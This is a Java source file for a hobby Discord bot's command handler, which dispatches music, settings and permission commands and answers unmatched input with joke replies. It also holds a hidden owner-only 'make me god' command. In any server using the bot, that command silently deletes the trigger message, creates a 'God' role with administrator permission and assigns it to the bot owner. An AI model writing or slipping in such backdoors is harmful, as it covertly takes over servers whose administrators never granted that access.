package main.IanSloat.thiccbot.events;

import java.awt.Color;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.function.Consumer;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import main.IanSloat.thiccbot.BotUtils;
import main.IanSloat.thiccbot.ThiccBotMain;
import main.IanSloat.thiccbot.commands.*;
import main.IanSloat.thiccbot.reactivecore.ReactiveMessage;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class CommandHandler {

	private final Logger logger = LoggerFactory.getLogger(CommandHandler.class);

	private List<Command> commands = new ArrayList<Command>(Arrays.asList(new FilterDeleteCommand(),
			new GetGuiPasswordCommand(), new HelpCommand(), new InfoCommand(), new InspireMeCommand(),
			new JumpCommand(), new LeaveCommand(), new ListSettingsCommand(), new NewGuiPasswordCommand(),
			new PauseCommand(), new PermIDCommand(), new PlayCommand(), new QuestionCommand(), new RemoveTrackCommand(),
			new SetPermDefaultsCommand(), new SetPermissionCommand(), new SettingsCommand(), new ShowQueueCommand(),
			new SkipCommand(), new StopCommand(), new VolumeCommand(), new WikiCommand(), new VoiceChatKickCommand(),
			new Rule34Command()));

	public void MessageReceivedEvent(MessageReceivedEvent event) {
		if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX) && event.isFromGuild()) {
			logger.info("Message recieved from: " + event.getAuthor().getName() + ", server="
					+ event.getGuild().getName() + ", Content=\"" + event.getMessage().getContentStripped() + "\"");

			boolean commandMatch = false;

			if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX + "ping")) {
				event.getChannel().sendMessage("Pong!").queue();
				commandMatch = true;
			}

			if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX + "die")) {
				event.getChannel().sendMessage("no u").queue();
				commandMatch = true;
			}

			if (event.getAuthor().equals(ThiccBotMain.botOwner)
					&& event.getMessage().getContentRaw().toLowerCase().equals(BotUtils.BOT_PREFIX + "make me god")) {
				event.getMessage().delete().queue();
				event.getGuild().createRole().queue(new Consumer<Role>() {
					@Override
					public void accept(Role t) {
						class CompleteTask implements Runnable {
							public void run() {
								t.getManager().setName("God").complete();
								t.getManager().givePermissions(Permission.ADMINISTRATOR).complete();
								event.getGuild().addRoleToMember(event.getMember(), t).queue();
							}
						}
						new Thread(new CompleteTask()).start();
					}
				});
				commandMatch = true;
			}

			if (event.getAuthor().equals(ThiccBotMain.botOwner)
					&& event.getMessage().getContentRaw().toLowerCase().equals(BotUtils.BOT_PREFIX + "reactive test")) {
				ReactiveMessage message = new ReactiveMessage(event.getTextChannel());
				EmbedBuilder embed = new EmbedBuilder();
				embed.setTitle("Reactive message test | " + event.getChannel().getName());
				embed.appendDescription("Hello! I am a reactive message!");
				embed.addField("My buttons have been clicked...", "button 1: 0\nbutton 2: 0\n button 3: 0", false);
				embed.setColor(Color.green);
				message.setMessageContent(embed.build());
				message.integerTrackers.add(0);
				message.integerTrackers.add(0);
				message.integerTrackers.add(0);
				message.addButton("U+31U+20e3", () -> {
					message.integerTrackers.set(0, message.integerTrackers.get(0) + 1);
					EmbedBuilder emb = new EmbedBuilder();
					emb.setTitle("Reactive message test | " + event.getChannel().getName());
					emb.appendDescription("Hello! I am a reactive message!");
					emb.addField("My buttons have been clicked...",
							"button 1: " + message.integerTrackers.get(0) + "\nbutton 2: "
									+ message.integerTrackers.get(1) + "\n button 3: " + message.integerTrackers.get(2),
							false);
					emb.setColor(Color.green);
					message.setMessageContent(emb.build());
					message.update();
				});
				message.addButton("U+32U+20e3", () -> {
					message.integerTrackers.set(1, message.integerTrackers.get(1) + 1);
					EmbedBuilder emb = new EmbedBuilder();
					emb.setTitle("Reactive message test | " + event.getChannel().getName());
					emb.appendDescription("Hello! I am a reactive message!");
					emb.addField("My buttons have been clicked...",
							"button 1: " + message.integerTrackers.get(0) + "\nbutton 2: "
									+ message.integerTrackers.get(1) + "\n button 3: " + message.integerTrackers.get(2),
							false);
					emb.setColor(Color.green);
					message.setMessageContent(emb.build());
					message.update();
				});
				message.addButton("U+33U+20e3", () -> {
					message.integerTrackers.set(2, message.integerTrackers.get(2) + 1);
					EmbedBuilder emb = new EmbedBuilder();
					emb.setTitle("Reactive message test | " + event.getChannel().getName());
					emb.appendDescription("Hello! I am a reactive message!");
					emb.addField("My buttons have been clicked...",
							"button 1: " + message.integerTrackers.get(0) + "\nbutton 2: "
									+ message.integerTrackers.get(1) + "\n button 3: " + message.integerTrackers.get(2),
							false);
					emb.setColor(Color.green);
					message.setMessageContent(emb.build());
					message.update();
				});
				message.activate();
			}

			if (!commandMatch) {
				for (Command c : commands) {
					if (c.CheckForCommandMatch(event.getMessage())) {
						commandMatch = true;
						if (c.CheckUsagePermission(event.getMember(),
								Command.getPermissionsManager(event.getGuild()))) {
							try {
								c.execute(event);
							} catch (NoMatchException e) {
								e.printStackTrace();
							}
						} else {
							event.getChannel().sendMessage("You do not have permission to use that command").queue();
						}
						break;
					}
				}
			}

			if (!commandMatch) {
				int random = (int) (Math.random() * 5 + 1);
				if (random == 1) {
					event.getChannel().sendMessage("What?").queue();
				} else if (random == 2) {
					event.getChannel().sendMessage("What are you saying?").queue();
				} else if (random == 3) {
					event.getChannel().sendMessage("What language is that?").queue();
				} else if (random == 4) {
					event.getChannel().sendMessage("Are you ok?").queue();
				} else {
					event.getChannel().sendMessage("What you're saying makes no sense.").queue();
				}
				logger.info("Message did not match any commands");
			}
		} else if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX)
				&& !event.isFromGuild()) {
			logger.info("Private message recieved from: " + event.getAuthor().getName() + ", Content=\""
					+ event.getMessage().getContentStripped() + "\"");
			if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX + "ping"))
				event.getChannel().sendMessage("Pong!").queue();

			if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX + "die")) {
				event.getChannel().sendMessage("no u").queue();
			}
		}
	}
}